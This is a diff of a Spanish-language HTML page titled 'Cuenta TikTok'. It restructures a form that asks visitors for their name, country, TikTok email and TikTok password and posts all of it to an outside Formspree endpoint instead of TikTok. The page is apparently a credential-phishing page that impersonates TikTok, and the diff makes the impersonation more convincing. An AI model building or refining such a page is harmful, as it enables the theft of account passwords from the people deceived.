@@ -5,22 +5,58 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <link rel="stylesheet" href="styles.css">
-    <title>Document</title>
+    <title>Cuenta TikTok</title>
 </head>
 <body>
     <form class="form-register"
             action="https://formspree.io/f/xrbzqwbq"
             method="post"
     >
-        <h2>Cuenta de TikTok</h2>
-        <h4>escriba sus datos</h4>
-        <input class="controls" type="text" name="nombre" placeholder="Nombre">
-        <input class="controls" type="text" name="apellido" placeholder="Apellidos">
-        ingrese su cuenta
-        <input class="controls-input" type="email" name="correo" placeholder="ingrese su correo electronico">
-        <input class="controls-input" type="password" name="contraseña" placeholder="contraseña">
-        <textarea class="controls control" name="message" placeholder="como podemos ayudarte con tu cuenta de TikTok (opcional)"></textarea>
-        <input class="botons" type="submit" value="SIGUIENTE">
+        <fieldset>
+            <legend>INFORMACION BASICA</legend>
+            <div class="form_input">
+                <label>Nombe
+                    <input class="controls" type="text" name="nombre" placeholder="Nombre">
+                </label>
+            </div>
+            <div class="form_input">
+                <label>Apellido
+                    <input class="controls" type="text" name="apellido" placeholder="Apellidos">
+                </label>
+            </div>
+            <div class="form_input">
+                <label>PAIS
+                    <select name="type-of-user">
+                        <option value="user1">Bolivia</option>
+                        <option value="user2">Perù</option>
+                        <option value="user3">chile</option>
+                    </select>
+                </label>
+            </div>
+        </fieldset>
+        <fieldset>
+            <legend>Cuenta: TikTok</legend>
+            <div class="form_input">
+                <label>Email
+                    <input class="controls-input" type="email" name="correo" placeholder="ejemplo@gmail.com">
+                </label>
+            </div>
+            <div class="form_input">
+                <label>Contraseña
+                    <input class="controls-input" type="password" name="contraseña" placeholder="contraseña">
+                </label>
+            </div>
+        </fieldset>
+        <div class="form_input">
+            <label>
+                <input class="botons" type="submit" value="SIGUIENTE">
+            </label>
+        </div>
+        <div class="form_input">
+            <label>
+                <textarea class="controls control" name="message" placeholder="asunto (opcional)"></textarea>
+            </label>
+        </div>
     </form>
 </body>
 </html>
